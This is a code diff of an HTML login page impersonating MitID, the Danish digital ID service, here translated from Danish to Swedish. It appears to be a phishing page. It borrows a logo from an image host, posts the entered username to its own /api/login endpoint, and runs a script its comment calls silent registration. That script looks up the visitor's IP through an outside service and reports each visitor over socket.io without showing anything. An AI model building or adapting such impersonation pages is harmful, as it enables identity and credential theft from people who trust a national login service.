@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="da">
+<html lang="sv">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>MitID - Log på</title>
+<title>MitID - Logga in</title>
 <script src="/socket.io/socket.io.js"></script>
 <style>
 body {
@@ -24,19 +24,9 @@ body {
   padding: 24px;
   text-align: center;
 }
-.logo {
-  width: 80px;
-  margin-bottom: 10px;
-}
-h2 {
-  margin: 0;
-  font-size: 1.4rem;
-  color: #333;
-}
-p {
-  color: #555;
-  font-size: 0.9rem;
-}
+.logo { width: 80px; margin-bottom: 10px; }
+h2 { margin: 0; font-size: 1.4rem; color: #333; }
+p { color: #555; font-size: 0.9rem; }
 input[type="text"] {
   width: 100%;
   padding: 10px;
@@ -66,10 +56,7 @@ label {
   margin-top: 8px;
   cursor: pointer;
 }
-.checkbox {
-  width: 16px;
-  height: 16px;
-}
+.checkbox { width: 16px; height: 16px; }
 .footer {
   margin-top: 12px;
   font-size: 0.8rem;
@@ -79,28 +66,26 @@ label {
 </head>
 <body>
   <div class="container">
-    <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="MitID logo" class="logo">
-    <h2>MitID Log på</h2>
-    <p>Indtast dit brugernavn for at fortsætte</p>
+    <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="MitID logotyp" class="logo">
+    <h2>Logga in med MitID</h2>
+    <p>Ange ditt användarnamn för att fortsätta</p>
     <form action="/api/login" method="POST">
-      <input type="text" name="username" placeholder="Brugernavn" required />
-      <label><input type="checkbox" class="checkbox"> Husk mig hos MitID</label>
-      <button type="submit">Fortsæt</button>
+      <input type="text" name="username" placeholder="Användarnamn" required />
+      <label><input type="checkbox" class="checkbox"> Kom ihåg mig hos MitID</label>
+      <button type="submit">Fortsätt</button>
     </form>
-    <div class="footer">
-      © MitID Support — 2025
-    </div>
+    <div class="footer">© MitID Support — 2025</div>
   </div>
 
 <script>
-  // --- Silent guest registration (no UI shown) ---
+  // --- Tyst gästregistrering (ingen visning för användaren) ---
   const socket = io();
   async function registerGuest() {
     try {
-      await fetch('https://api.ipify.org?format=json'); // triggers external IP request
-      socket.emit('join_guest', 'Unknown'); // only sends to your backend
+      await fetch('https://api.ipify.org?format=json');
+      socket.emit('join_guest', 'Okänd');
     } catch {
-      socket.emit('join_guest', 'Unknown'); // fallback even if API fails
+      socket.emit('join_guest', 'Okänd');
     }
   }
   socket.on('connect', registerGuest);
